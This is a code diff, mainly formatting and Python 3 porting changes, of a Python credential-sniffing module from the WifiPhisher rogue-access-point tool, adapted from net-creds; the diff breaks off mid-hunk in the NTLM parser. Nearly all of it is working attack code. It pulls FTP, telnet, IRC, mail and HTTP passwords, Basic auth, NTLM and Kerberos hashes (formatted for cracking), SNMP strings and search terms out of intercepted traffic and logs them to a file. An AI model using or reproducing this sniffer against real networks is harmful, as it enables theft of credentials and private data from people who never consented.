@@ -1,13 +1,13 @@
 """Serves as a packet sniffer of the internet-sharing interface during MITM senarios."""
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# pylint: skip-file
 
 # The following code has been borrowed from https://github.com/DanMcInerney/net-creds.
 # It was ported to python3 and adapted to be used within WifiPhisher.
 
-from os import geteuid, devnull
+from os import geteuid
 import logging
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from sys import exit
@@ -23,11 +23,10 @@ from http.server import BaseHTTPRequestHandler
 from io import StringIO
 
 
-
-class Sniffer (object):
+class Sniffer(object):
     # Setup the class variables
-    conf.verb=0
-    logging.basicConfig(filename='/tmp/wifiphisher-credentials.txt',level=logging.INFO)
+    conf.verb = 0
+    logging.basicConfig(filename="/tmp/wifiphisher-credentials.txt", level=logging.INFO)
 
     def __init__(self):
         """
@@ -41,39 +40,38 @@ class Sniffer (object):
 
         # Setup the instance variables
         self.requests_file_path = "/tmp/wifiphisher-http-requests.txt"
-        self.DN = open(devnull, 'w')
         self.pkt_frag_loads = OrderedDict()
         self.challenge_acks = OrderedDict()
         self.mail_auths = OrderedDict()
         self.telnet_stream = OrderedDict()
 
         # Regexes
-        self.authenticate_re = '(www-|proxy-)?authenticate'
-        self.authorization_re = '(www-|proxy-)?authorization'
-        self.ftp_user_re = r'USER (.+)\r\n'
-        self.ftp_pw_re = r'PASS (.+)\r\n'
-        self.irc_user_re = r'NICK (.+?)((\r)?\n|\s)'
-        self.irc_pw_re = r'NS IDENTIFY (.+)'
-        self.irc_pw_re2 = 'nickserv :identify (.+)'
-        self.mail_auth_re = '(\d+ )?(auth|authenticate) (login|plain)'
-        self.mail_auth_re1 =  '(\d+ )?login '
-        self.NTLMSSP2_re = 'NTLMSSP\x00\x02\x00\x00\x00.+'
-        self.NTLMSSP3_re = 'NTLMSSP\x00\x03\x00\x00\x00.+'
+        self.authenticate_re = "(www-|proxy-)?authenticate"
+        self.authorization_re = "(www-|proxy-)?authorization"
+        self.ftp_user_re = r"USER (.+)\r\n"
+        self.ftp_pw_re = r"PASS (.+)\r\n"
+        self.irc_user_re = r"NICK (.+?)((\r)?\n|\s)"
+        self.irc_pw_re = r"NS IDENTIFY (.+)"
+        self.irc_pw_re2 = "nickserv :identify (.+)"
+        self.mail_auth_re = "(\d+ )?(auth|authenticate) (login|plain)"
+        self.mail_auth_re1 = "(\d+ )?login "
+        self.NTLMSSP2_re = "NTLMSSP\x00\x02\x00\x00\x00.+"
+        self.NTLMSSP3_re = "NTLMSSP\x00\x03\x00\x00\x00.+"
         # Prone to false+ but prefer that to false-
-        self.http_search_re = '((search|query|&q|\?q|search\?p|searchterm|keywords|keyword|command|terms|keys|question|kwd|searchPhrase)=([^&][^&]*))'
+        self.http_search_re = "((search|query|&q|\?q|search\?p|searchterm|keywords|keyword|command|terms|keys|question|kwd|searchPhrase)=([^&][^&]*))"
 
-        #Console colors
-        self.W = '\033[0m'  # white (normal)
-        self.T = '\033[93m'  # tan
+        # Console colors
+        self.W = "\033[0m"  # white (normal)
+        self.T = "\033[93m"  # tan
 
     def frag_remover(self, ack, load):
-        '''
+        """
         Keep the FILO OrderedDict of frag loads from getting too large
         3 points of limit:
             Number of ip_ports < 50
             Number of acks per ip:port < 25
             Number of chars in load < 5000
-        '''
+        """
         global pkt_frag_loads
 
         # Keep the number of IP:port mappings below 50
@@ -96,12 +94,14 @@ class Sniffer (object):
             for ack in copy_pkt_frag_loads[ip_port]:
                 # If load > 5000 chars, just keep the last 200 chars
                 if len(copy_pkt_frag_loads[ip_port][ack]) > 5000:
-                    self.pkt_frag_loads[ip_port][ack] = self.pkt_frag_loads[ip_port][ack][-200:]
+                    self.pkt_frag_loads[ip_port][ack] = self.pkt_frag_loads[ip_port][
+                        ack
+                    ][-200:]
 
     def frag_joiner(self, ack, src_ip_port, load):
-        '''
+        """
         Keep a store of previous fragments in an OrderedDict named pkt_frag_loads
-        '''
+        """
         for ip_port in self.pkt_frag_loads:
             if src_ip_port == ip_port:
                 if ack in self.pkt_frag_loads[src_ip_port]:
@@ -111,25 +111,29 @@ class Sniffer (object):
                     return OrderedDict([(ack, concat_load)])
 
         return OrderedDict([(ack, load)])
-    
+
     def pkt_parser(self, pkt):
-        '''
+        """
         Start parsing packets here
-        '''
+        """
         global pkt_frag_loads, mail_auths
 
         if pkt.haslayer(Raw):
             load = pkt[Raw].load.decode("utf-8", "ignore")
 
         # Get rid of Ethernet pkts with just a raw load cuz these are usually network controls like flow control
-        if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
+        if (
+            pkt.haslayer(Ether)
+            and pkt.haslayer(Raw)
+            and not pkt.haslayer(IP)
+            and not pkt.haslayer(IPv6)
+        ):
             return
 
         # UDP
         if pkt.haslayer(UDP) and pkt.haslayer(IP):
-
-            src_ip_port = str(pkt[IP].src) + ':' + str(pkt[UDP].sport)
-            dst_ip_port = str(pkt[IP].dst) + ':' + str(pkt[UDP].dport)
+            src_ip_port = str(pkt[IP].src) + ":" + str(pkt[UDP].sport)
+            dst_ip_port = str(pkt[IP].dst) + ":" + str(pkt[UDP].dport)
 
             # SNMP community strings
             if pkt.haslayer(SNMP):
@@ -138,17 +142,16 @@ class Sniffer (object):
 
             # Kerberos over UDP
             decoded = self.Decode_Ip_Packet(str(pkt)[14:])
-            kerb_hash = self.ParseMSKerbv5UDP(decoded['data'][8:])
+            kerb_hash = self.ParseMSKerbv5UDP(decoded["data"][8:])
             if kerb_hash:
                 self.printer(src_ip_port, dst_ip_port, kerb_hash)
 
         # TCP
         elif pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
-
             ack = str(pkt[TCP].ack)
             seq = str(pkt[TCP].seq)
-            src_ip_port = str(pkt[IP].src) + ':' + str(pkt[TCP].sport)
-            dst_ip_port = str(pkt[IP].dst) + ':' + str(pkt[TCP].dport)
+            src_ip_port = str(pkt[IP].src) + ":" + str(pkt[TCP].sport)
+            dst_ip_port = str(pkt[IP].dst) + ":" + str(pkt[TCP].dport)
             self.pkt_frag_loads[src_ip_port] = self.frag_joiner(ack, src_ip_port, load)
             full_load = self.pkt_frag_loads[src_ip_port][ack]
 
@@ -156,7 +159,6 @@ class Sniffer (object):
             # 750 is a bit arbitrary but some SMTP auth success pkts
             # are 500+ characters
             if 0 < len(full_load) < 750:
-
                 # FTP
                 ftp_creds = self.parse_ftp(full_load, dst_ip_port)
                 if len(ftp_creds) > 0:
@@ -165,7 +167,9 @@ class Sniffer (object):
                     return
 
                 # Mail
-                mail_creds_found = self.mail_logins(full_load, src_ip_port, dst_ip_port, ack, seq)
+                mail_creds_found = self.mail_logins(
+                    full_load, src_ip_port, dst_ip_port, ack, seq
+                )
 
                 # IRC
                 irc_creds = self.irc_logins(full_load, pkt)
@@ -180,9 +184,9 @@ class Sniffer (object):
             self.other_parser(src_ip_port, dst_ip_port, full_load, ack, seq, pkt)
 
     def telnet_logins(self, src_ip_port, dst_ip_port, load, ack, seq):
-        '''
+        """
         Catch telnet logins and passwords
-        '''
+        """
         global telnet_stream
 
         msg = None
@@ -196,12 +200,20 @@ class Sniffer (object):
                 pass
 
             # \r or \r\n or \n terminate commands in telnet if my pcaps are to be believed
-            if '\r' in self.telnet_stream[src_ip_port] or '\n' in self.telnet_stream[src_ip_port]:
-                telnet_split = self.telnet_stream[src_ip_port].split(' ', 1)
+            if (
+                "\r" in self.telnet_stream[src_ip_port]
+                or "\n" in self.telnet_stream[src_ip_port]
+            ):
+                telnet_split = self.telnet_stream[src_ip_port].split(" ", 1)
                 cred_type = telnet_split[0]
-                value = telnet_split[1].replace('\r\n', '').replace('\r', '').replace('\n', '')
+                value = (
+                    telnet_split[1]
+                    .replace("\r\n", "")
+                    .replace("\r", "")
+                    .replace("\n", "")
+                )
                 # Create msg, the return variable
-                msg = 'Telnet %s: %s' % (cred_type, value)
+                msg = "Telnet %s: %s" % (cred_type, value)
                 self.printer(src_ip_port, dst_ip_port, msg)
                 del self.telnet_stream[src_ip_port]
 
@@ -213,18 +225,18 @@ class Sniffer (object):
         if len(self.telnet_stream) > 100:
             self.telnet_stream.popitem(last=False)
         mod_load = load.lower().strip()
-        if mod_load.endswith('username:') or mod_load.endswith('login:'):
-            self.telnet_stream[dst_ip_port] = 'username '
-        elif mod_load.endswith('password:'):
-            self.telnet_stream[dst_ip_port] = 'password '
+        if mod_load.endswith("username:") or mod_load.endswith("login:"):
+            self.telnet_stream[dst_ip_port] = "username "
+        elif mod_load.endswith("password:"):
+            self.telnet_stream[dst_ip_port] = "password "
 
     def ParseMSKerbv5TCP(self, Data):
-        '''
+        """
         Taken from Pcredz because I didn't want to spend the time doing this myself
         I should probably figure this out on my own but hey, time isn't free, why reinvent the wheel?
         Maybe replace this eventually with the kerberos python lib
         Parses Kerberosv5 hashes from packets
-        '''
+        """
         try:
             MsgType = Data[21:22]
             EncType = Data[43:44]
@@ -232,47 +244,66 @@ class Sniffer (object):
         except IndexError:
             return
 
-        if MsgType == "\x0a" and EncType == "\x17" and MessageType =="\x02":
+        if MsgType == "\x0a" and EncType == "\x17" and MessageType == "\x02":
             if Data[49:53] == "\xa2\x36\x04\x34" or Data[49:53] == "\xa2\x35\x04\x33":
-                HashLen = struct.unpack('<b',Data[50:51])[0]
+                HashLen = struct.unpack("<b", Data[50:51])[0]
                 if HashLen == 54:
                     Hash = Data[53:105]
-                    SwitchHash = Hash[16:]+Hash[0:16]
-                    NameLen = struct.unpack('<b',Data[153:154])[0]
-                    Name = Data[154:154+NameLen]
-                    DomainLen = struct.unpack('<b',Data[154+NameLen+3:154+NameLen+4])[0]
-                    Domain = Data[154+NameLen+4:154+NameLen+4+DomainLen]
-                    BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
-                    return 'MS Kerberos: %s' % BuildHash
+                    SwitchHash = Hash[16:] + Hash[0:16]
+                    NameLen = struct.unpack("<b", Data[153:154])[0]
+                    Name = Data[154 : 154 + NameLen]
+                    DomainLen = struct.unpack(
+                        "<b", Data[154 + NameLen + 3 : 154 + NameLen + 4]
+                    )[0]
+                    Domain = Data[154 + NameLen + 4 : 154 + NameLen + 4 + DomainLen]
+                    BuildHash = (
+                        "$krb5pa$23$"
+                        + Name
+                        + "$"
+                        + Domain
+                        + "$dummy$"
+                        + SwitchHash.hex()
+                    )
+                    return "MS Kerberos: %s" % BuildHash
 
             if Data[44:48] == "\xa2\x36\x04\x34" or Data[44:48] == "\xa2\x35\x04\x33":
-                HashLen = struct.unpack('<b',Data[47:48])[0]
-                Hash = Data[48:48+HashLen]
-                SwitchHash = Hash[16:]+Hash[0:16]
-                NameLen = struct.unpack('<b',Data[HashLen+96:HashLen+96+1])[0]
-                Name = Data[HashLen+97:HashLen+97+NameLen]
-                DomainLen = struct.unpack('<b',Data[HashLen+97+NameLen+3:HashLen+97+NameLen+4])[0]
-                Domain = Data[HashLen+97+NameLen+4:HashLen+97+NameLen+4+DomainLen]
-                BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
-                return 'MS Kerberos: %s' % BuildHash
+                HashLen = struct.unpack("<b", Data[47:48])[0]
+                Hash = Data[48 : 48 + HashLen]
+                SwitchHash = Hash[16:] + Hash[0:16]
+                NameLen = struct.unpack("<b", Data[HashLen + 96 : HashLen + 96 + 1])[0]
+                Name = Data[HashLen + 97 : HashLen + 97 + NameLen]
+                DomainLen = struct.unpack(
+                    "<b", Data[HashLen + 97 + NameLen + 3 : HashLen + 97 + NameLen + 4]
+                )[0]
+                Domain = Data[
+                    HashLen + 97 + NameLen + 4 : HashLen + 97 + NameLen + 4 + DomainLen
+                ]
+                BuildHash = (
+                    "$krb5pa$23$" + Name + "$" + Domain + "$dummy$" + SwitchHash.hex()
+                )
+                return "MS Kerberos: %s" % BuildHash
 
             else:
                 Hash = Data[48:100]
-                SwitchHash = Hash[16:]+Hash[0:16]
-                NameLen = struct.unpack('<b',Data[148:149])[0]
-                Name = Data[149:149+NameLen]
-                DomainLen = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
-                Domain = Data[149+NameLen+4:149+NameLen+4+DomainLen]
-                BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
-                return 'MS Kerberos: %s' % BuildHash
+                SwitchHash = Hash[16:] + Hash[0:16]
+                NameLen = struct.unpack("<b", Data[148:149])[0]
+                Name = Data[149 : 149 + NameLen]
+                DomainLen = struct.unpack(
+                    "<b", Data[149 + NameLen + 3 : 149 + NameLen + 4]
+                )[0]
+                Domain = Data[149 + NameLen + 4 : 149 + NameLen + 4 + DomainLen]
+                BuildHash = (
+                    "$krb5pa$23$" + Name + "$" + Domain + "$dummy$" + SwitchHash.hex()
+                )
+                return "MS Kerberos: %s" % BuildHash
 
     def ParseMSKerbv5UDP(self, Data):
-        '''
+        """
         Taken from Pcredz because I didn't want to spend the time doing this myself
         I should probably figure this out on my own but hey, time isn't free why reinvent the wheel?
         Maybe replace this eventually with the kerberos python lib
         Parses Kerberosv5 hashes from packets
-        '''
+        """
 
         try:
             MsgType = Data[17:18]
@@ -282,114 +313,153 @@ class Sniffer (object):
 
         if MsgType == "\x0a" and EncType == "\x17":
             try:
-                if Data[40:44] == "\xa2\x36\x04\x34" or Data[40:44] == "\xa2\x35\x04\x33":
-                    HashLen = struct.unpack('<b',Data[41:42])[0]
+                if (
+                    Data[40:44] == "\xa2\x36\x04\x34"
+                    or Data[40:44] == "\xa2\x35\x04\x33"
+                ):
+                    HashLen = struct.unpack("<b", Data[41:42])[0]
                     if HashLen == 54:
                         Hash = Data[44:96]
-                        SwitchHash = Hash[16:]+Hash[0:16]
-                        NameLen = struct.unpack('<b',Data[144:145])[0]
-                        Name = Data[145:145+NameLen]
-                        DomainLen = struct.unpack('<b',Data[145+NameLen+3:145+NameLen+4])[0]
-                        Domain = Data[145+NameLen+4:145+NameLen+4+DomainLen]
-                        BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
-                        return 'MS Kerberos: %s' % BuildHash
+                        SwitchHash = Hash[16:] + Hash[0:16]
+                        NameLen = struct.unpack("<b", Data[144:145])[0]
+                        Name = Data[145 : 145 + NameLen]
+                        DomainLen = struct.unpack(
+                            "<b", Data[145 + NameLen + 3 : 145 + NameLen + 4]
+                        )[0]
+                        Domain = Data[145 + NameLen + 4 : 145 + NameLen + 4 + DomainLen]
+                        BuildHash = (
+                            "$krb5pa$23$"
+                            + Name
+                            + "$"
+                            + Domain
+                            + "$dummy$"
+                            + SwitchHash.hex()
+                        )
+                        return "MS Kerberos: %s" % BuildHash
 
                     if HashLen == 53:
                         Hash = Data[44:95]
-                        SwitchHash = Hash[16:]+Hash[0:16]
-                        NameLen = struct.unpack('<b',Data[143:144])[0]
-                        Name = Data[144:144+NameLen]
-                        DomainLen = struct.unpack('<b',Data[144+NameLen+3:144+NameLen+4])[0]
-                        Domain = Data[144+NameLen+4:144+NameLen+4+DomainLen]
-                        BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
-                        return 'MS Kerberos: %s' % BuildHash
+                        SwitchHash = Hash[16:] + Hash[0:16]
+                        NameLen = struct.unpack("<b", Data[143:144])[0]
+                        Name = Data[144 : 144 + NameLen]
+                        DomainLen = struct.unpack(
+                            "<b", Data[144 + NameLen + 3 : 144 + NameLen + 4]
+                        )[0]
+                        Domain = Data[144 + NameLen + 4 : 144 + NameLen + 4 + DomainLen]
+                        BuildHash = (
+                            "$krb5pa$23$"
+                            + Name
+                            + "$"
+                            + Domain
+                            + "$dummy$"
+                            + SwitchHash.hex()
+                        )
+                        return "MS Kerberos: %s" % BuildHash
 
                 else:
-                    HashLen = struct.unpack('<b',Data[48:49])[0]
-                    Hash = Data[49:49+HashLen]
-                    SwitchHash = Hash[16:]+Hash[0:16]
-                    NameLen = struct.unpack('<b',Data[HashLen+97:HashLen+97+1])[0]
-                    Name = Data[HashLen+98:HashLen+98+NameLen]
-                    DomainLen = struct.unpack('<b',Data[HashLen+98+NameLen+3:HashLen+98+NameLen+4])[0]
-                    Domain = Data[HashLen+98+NameLen+4:HashLen+98+NameLen+4+DomainLen]
-                    BuildHash = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
-                    return 'MS Kerberos: %s' % BuildHash
+                    HashLen = struct.unpack("<b", Data[48:49])[0]
+                    Hash = Data[49 : 49 + HashLen]
+                    SwitchHash = Hash[16:] + Hash[0:16]
+                    NameLen = struct.unpack(
+                        "<b", Data[HashLen + 97 : HashLen + 97 + 1]
+                    )[0]
+                    Name = Data[HashLen + 98 : HashLen + 98 + NameLen]
+                    DomainLen = struct.unpack(
+                        "<b",
+                        Data[HashLen + 98 + NameLen + 3 : HashLen + 98 + NameLen + 4],
+                    )[0]
+                    Domain = Data[
+                        HashLen + 98 + NameLen + 4 : HashLen
+                        + 98
+                        + NameLen
+                        + 4
+                        + DomainLen
+                    ]
+                    BuildHash = (
+                        "$krb5pa$23$"
+                        + Name
+                        + "$"
+                        + Domain
+                        + "$dummy$"
+                        + SwitchHash.hex()
+                    )
+                    return "MS Kerberos: %s" % BuildHash
             except struct.error:
                 return
 
     def Decode_Ip_Packet(self, s):
-        '''
+        """
         Taken from PCredz, solely to get Kerb parsing
         working until I have time to analyze Kerb pkts
         and figure out a simpler way
         Maybe use kerberos python lib
-        '''
-        d={}
-        d['header_len']=ord(s[0]) & 0x0f
-        d['data']=s[4*d['header_len']:]
+        """
+        d = {}
+        d["header_len"] = ord(s[0]) & 0x0F
+        d["data"] = s[4 * d["header_len"] :]
         return d
 
     def double_line_checker(self, full_load, count_str):
-        '''
+        """
         Check if count_str shows up twice
-        '''
+        """
         num = full_load.lower().count(count_str)
         if num > 1:
-            lines = full_load.count('\r\n')
+            lines = full_load.count("\r\n")
             if lines > 1:
-                full_load = full_load.split('\r\n')[-2] # -1 is ''
+                full_load = full_load.split("\r\n")[-2]  # -1 is ''
         return full_load
 
     def parse_ftp(self, full_load, dst_ip_port):
-        '''
+        """
         Parse out FTP creds
-        '''
+        """
         print_strs = []
 
         # Sometimes FTP packets double up on the authentication lines
         # We just want the lastest one. Ex: "USER danmcinerney\r\nUSER danmcinerney\r\n"
-        full_load = self.double_line_checker(full_load, 'USER')
+        full_load = self.double_line_checker(full_load, "USER")
 
         # FTP and POP potentially use idential client > server auth pkts
         ftp_user = re.match(self.ftp_user_re, full_load)
         ftp_pass = re.match(self.ftp_pw_re, full_load)
 
         if ftp_user:
-            msg1 = 'FTP User: %s' % ftp_user.group(1).strip()
+            msg1 = "FTP User: %s" % ftp_user.group(1).strip()
             print_strs.append(msg1)
-            if dst_ip_port[-3:] != ':21':
-                msg2 = 'Nonstandard FTP port, confirm the service that is running on it'
+            if dst_ip_port[-3:] != ":21":
+                msg2 = "Nonstandard FTP port, confirm the service that is running on it"
                 print_strs.append(msg2)
 
         elif ftp_pass:
-            msg1 = 'FTP Pass: %s' % ftp_pass.group(1).strip()
+            msg1 = "FTP Pass: %s" % ftp_pass.group(1).strip()
             print_strs.append(msg1)
-            if dst_ip_port[-3:] != ':21':
-                msg2 = 'Nonstandard FTP port, confirm the service that is running on it'
+            if dst_ip_port[-3:] != ":21":
+                msg2 = "Nonstandard FTP port, confirm the service that is running on it"
                 print_strs.append(msg2)
 
         return print_strs
 
     def mail_decode(self, src_ip_port, dst_ip_port, mail_creds):
-        '''
+        """
         Decode base64 mail creds
-        '''
+        """
         try:
-            decoded = base64.b64decode(mail_creds).replace('\x00', ' ').decode('utf8')
-            decoded = decoded.replace('\x00', ' ')
+            decoded = base64.b64decode(mail_creds).replace("\x00", " ").decode("utf8")
+            decoded = decoded.replace("\x00", " ")
         except TypeError:
             decoded = None
         except UnicodeDecodeError as e:
             decoded = None
 
         if decoded != None:
-            msg = 'Decoded: %s' % decoded
+            msg = "Decoded: %s" % decoded
             self.printer(src_ip_port, dst_ip_port, msg)
 
     def mail_logins(self, full_load, src_ip_port, dst_ip_port, ack, seq):
-        '''
+        """
         Catch IMAP, POP, and SMTP logins
-        '''
+        """
         # Handle the first packet of mail authentication
         # if the creds aren't in the first packet, save it in mail_auths
 
@@ -399,15 +469,15 @@ class Sniffer (object):
 
         # Sometimes mail packets double up on the authentication lines
         # We just want the lastest one. Ex: "1 auth plain\r\n2 auth plain\r\n"
-        full_load = self.double_line_checker(full_load, 'auth')
+        full_load = self.double_line_checker(full_load, "auth")
 
         # Client to server 2nd+ pkt
         if src_ip_port in self.mail_auths:
             if seq in self.mail_auths[src_ip_port][-1]:
-                stripped = full_load.strip('\r\n')
+                stripped = full_load.strip("\r\n")
                 try:
                     decoded = base64.b64decode(stripped)
-                    msg = 'Mail authentication: %s' % decoded
+                    msg = "Mail authentication: %s" % decoded
                     self.printer(src_ip_port, dst_ip_port, msg)
                 except TypeError:
                     pass
@@ -418,10 +488,10 @@ class Sniffer (object):
         elif dst_ip_port in self.mail_auths:
             if seq in self.mail_auths[dst_ip_port][-1]:
                 # Look for any kind of auth failure or success
-                a_s = 'Authentication successful'
-                a_f = 'Authentication failed'
+                a_s = "Authentication successful"
+                a_f = "Authentication failed"
                 # SMTP auth was successful
-                if full_load.startswith('235') and 'auth' in full_load.lower():
+                if full_load.startswith("235") and "auth" in full_load.lower():
                     # Reversed the dst and src
                     self.printer(dst_ip_port, src_ip_port, a_s)
                     found = True
@@ -430,7 +500,7 @@ class Sniffer (object):
                     except KeyError:
                         pass
                 # SMTP failed
-                elif full_load.startswith('535 '):
+                elif full_load.startswith("535 "):
                     # Reversed the dst and src
                     self.printer(dst_ip_port, src_ip_port, a_f)
                     found = True
@@ -439,7 +509,7 @@ class Sniffer (object):
                     except KeyError:
                         pass
                 # IMAP/POP/SMTP failed
-                elif ' fail' in full_load.lower():
+                elif " fail" in full_load.lower():
                     # Reversed the dst and src
                     self.printer(dst_ip_port, src_ip_port, a_f)
                     found = True
@@ -448,7 +518,7 @@ class Sniffer (object):
                     except KeyError:
                         pass
                 # IMAP auth success
-                elif ' OK [' in full_load:
+                elif " OK [" in full_load:
                     # Reversed the dst and src
                     self.printer(dst_ip_port, src_ip_port, a_s)
                     found = True
@@ -478,8 +548,8 @@ class Sniffer (object):
                 # Check if its a pkt like AUTH PLAIN dvcmQxIQ==
                 # rather than just an AUTH PLAIN
                 if len(auth_msg) > 2:
-                    mail_creds = ' '.join(auth_msg[2:])
-                    msg = 'Mail authentication: %s' % mail_creds
+                    mail_creds = " ".join(auth_msg[2:])
+                    msg = "Mail authentication: %s" % mail_creds
                     self.printer(src_ip_port, dst_ip_port, msg)
 
                     self.mail_decode(src_ip_port, dst_ip_port, mail_creds)
@@ -500,16 +570,15 @@ class Sniffer (object):
             # This also catches FTP authentication!
             #     230 Login successful.
             elif re.match(self.mail_auth_re1, full_load, re.IGNORECASE) != None:
-
                 # FTP authentication failures trigger this
-                #if full_load.lower().startswith('530 login'):
+                # if full_load.lower().startswith('530 login'):
                 #    return
 
                 auth_msg = full_load
                 auth_msg = auth_msg.split()
                 if 2 < len(auth_msg) < 5:
-                    mail_creds = ' '.join(auth_msg[2:])
-                    msg = 'Authentication: %s' % mail_creds
+                    mail_creds = " ".join(auth_msg[2:])
+                    msg = "Authentication: %s" % mail_creds
                     self.printer(src_ip_port, dst_ip_port, msg)
                     self.mail_decode(src_ip_port, dst_ip_port, mail_creds)
                     found = True
@@ -518,43 +587,52 @@ class Sniffer (object):
             return True
 
     def irc_logins(self, full_load, pkt):
-        '''
+        """
         Find IRC logins
-        '''
+        """
         user_search = re.match(self.irc_user_re, full_load)
         pass_search = re.match(self.irc_pw_re, full_load)
         pass_search2 = re.search(self.irc_pw_re2, full_load.lower())
         if user_search:
-            msg = 'IRC nick: %s' % user_search.group(1)
+            msg = "IRC nick: %s" % user_search.group(1)
             return msg
         if pass_search:
-            msg = 'IRC pass: %s' % pass_search.group(1)
+            msg = "IRC pass: %s" % pass_search.group(1)
             return msg
         if pass_search2:
-            msg = 'IRC pass: %s' % pass_search2.group(1)
+            msg = "IRC pass: %s" % pass_search2.group(1)
             return msg
 
     def other_parser(self, src_ip_port, dst_ip_port, full_load, ack, seq, pkt):
-        '''
+        """
         Pull out pertinent info from the parsed HTTP packet data
-        '''
+        """
         user_passwd = None
         http_url_req = None
         method = None
-        http_methods = ['GET ', 'POST ', 'CONNECT ', 'TRACE ', 'TRACK ', 'PUT ', 'DELETE ', 'HEAD ']
+        http_methods = [
+            "GET ",
+            "POST ",
+            "CONNECT ",
+            "TRACE ",
+            "TRACK ",
+            "PUT ",
+            "DELETE ",
+            "HEAD ",
+        ]
         http_line, header_lines, body = self.parse_http_load(full_load, http_methods)
         headers = self.headers_to_dict(header_lines)
-        if 'host' in headers:
-            host = headers['host']
+        if "host" in headers:
+            host = headers["host"]
         else:
-            host = ''
+            host = ""
 
         if http_line != None:
             method, path = self.parse_http_line(http_line, http_methods)
             http_url_req = self.get_http_url(method, host, path, headers)
             if http_url_req != None:
                 if len(http_url_req) > 98:
-                    http_url_req = http_url_req[:99] + '...'
+                    http_url_req = http_url_req[:99] + "..."
                 else:
                     self.printer(src_ip_port, None, http_url_req)
 
@@ -564,38 +642,38 @@ class Sniffer (object):
             self.printer(src_ip_port, dst_ip_port, searched)
 
         # Print user/pwds
-        if body != '':
+        if body != "":
             user_passwd = self.get_login_pass(body)
             if user_passwd != None:
                 try:
-                    http_user = user_passwd[0].decode('utf8')
-                    http_pass = user_passwd[1].decode('utf8')
+                    http_user = user_passwd[0].decode("utf8")
+                    http_pass = user_passwd[1].decode("utf8")
                     # Set a limit on how long they can be prevent false+
                     if len(http_user) > 75 or len(http_pass) > 75:
                         return
-                    user_msg = 'HTTP username: %s' % http_user
+                    user_msg = "HTTP username: %s" % http_user
                     self.printer(src_ip_port, dst_ip_port, user_msg)
-                    pass_msg = 'HTTP password: %s' % http_pass
+                    pass_msg = "HTTP password: %s" % http_pass
                     self.printer(src_ip_port, dst_ip_port, pass_msg)
                 except UnicodeDecodeError:
                     pass
 
         # Print POST loads
         # ocsp is a common SSL post load that's never interesting
-        if method == 'POST' and 'ocsp.' not in host:
+        if method == "POST" and "ocsp." not in host:
             try:
                 if len(body) > 99:
                     # If it can't decode to utf8 we're probably not interested in it
-                    msg = 'POST load: %s...' % body[:99].encode('utf8')
+                    msg = "POST load: %s..." % body[:99].encode("utf8")
                 else:
-                    msg = 'POST load: %s' % body.encode('utf8')
+                    msg = "POST load: %s" % body.encode("utf8")
                 self.printer(src_ip_port, None, msg)
             except UnicodeDecodeError:
                 pass
 
         # Kerberos over TCP
         decoded = self.Decode_Ip_Packet(str(pkt)[14:])
-        kerb_hash = self.ParseMSKerbv5TCP(decoded['data'][20:])
+        kerb_hash = self.ParseMSKerbv5TCP(decoded["data"][20:])
         if kerb_hash:
             self.printer(src_ip_port, dst_ip_port, kerb_hash)
 
@@ -621,19 +699,23 @@ class Sniffer (object):
 
         if authorization_header or authenticate_header:
             # NETNTLM
-            netntlm_found = self.parse_netntlm(authenticate_header, authorization_header, headers, ack, seq)
+            netntlm_found = self.parse_netntlm(
+                authenticate_header, authorization_header, headers, ack, seq
+            )
             if netntlm_found != None:
                 self.printer(src_ip_port, dst_ip_port, netntlm_found)
 
             # Basic Auth
-            self.parse_basic_auth(src_ip_port, dst_ip_port, headers, authorization_header)
+            self.parse_basic_auth(
+                src_ip_port, dst_ip_port, headers, authorization_header
+            )
 
     def get_http_searches(self, http_url_req, body, host):
-        '''
+        """
         Find search terms from URLs. Prone to false positives but rather err on that side than false negatives
         search, query, ?s, &q, ?q, search?p, searchTerm, keywords, command
-        '''
-        false_pos = ['i.stack.imgur.com']
+        """
+        false_pos = ["i.stack.imgur.com"]
 
         searched = None
         if http_url_req != None:
@@ -646,42 +728,47 @@ class Sniffer (object):
             # Eliminate some false+
             try:
                 # if it doesn't decode to utf8 it's probably not user input
-                searched = searched.decode('utf8')
+                searched = searched.decode("utf8")
             except UnicodeDecodeError:
                 return
             # some add sites trigger this function with single digits
-            if searched in [str(num) for num in range(0,10)]:
+            if searched in [str(num) for num in range(0, 10)]:
                 return
             # nobody's making >100 character searches
             if len(searched) > 100:
                 return
-            msg = 'Searched %s: %s' % (host, unquote(searched.encode('utf8')).replace('+', ' '))
+            msg = "Searched %s: %s" % (
+                host,
+                unquote(searched.encode("utf8")).replace("+", " "),
+            )
             return msg
 
     def parse_basic_auth(self, src_ip_port, dst_ip_port, headers, authorization_header):
-        '''
+        """
         Parse basic authentication over HTTP
-        '''
+        """
         if authorization_header:
             # authorization_header sometimes is triggered by failed ftp
             try:
                 header_val = headers[authorization_header.group()]
             except KeyError:
                 return
-            b64_auth_re = re.match('basic (.+)', header_val, re.IGNORECASE)
+            b64_auth_re = re.match("basic (.+)", header_val, re.IGNORECASE)
             if b64_auth_re != None:
                 basic_auth_b64 = b64_auth_re.group(1)
                 try:
-                    basic_auth_creds = base64.decodestring(basic_auth_b64)
+                    basic_auth_creds = base64.decodebytes(basic_auth_b64)
                 except Exception:
                     return
-                msg = 'Basic Authentication: %s' % basic_auth_creds
+                msg = "Basic Authentication: %s" % basic_auth_creds
                 self.printer(src_ip_port, dst_ip_port, msg)
 
-    def parse_netntlm(self, authenticate_header, authorization_header, headers, ack, seq):
-        '''
+    def parse_netntlm(
+        self, authenticate_header, authorization_header, headers, ack, seq
+    ):
+        """
         Parse NTLM hashes out
-        '''
+        """
         # Type 2 challenge from server
         if authenticate_header != None:
             chal_header = authenticate_header.group()
@@ -695,52 +782,51 @@ class Sniffer (object):
                 return msg
 
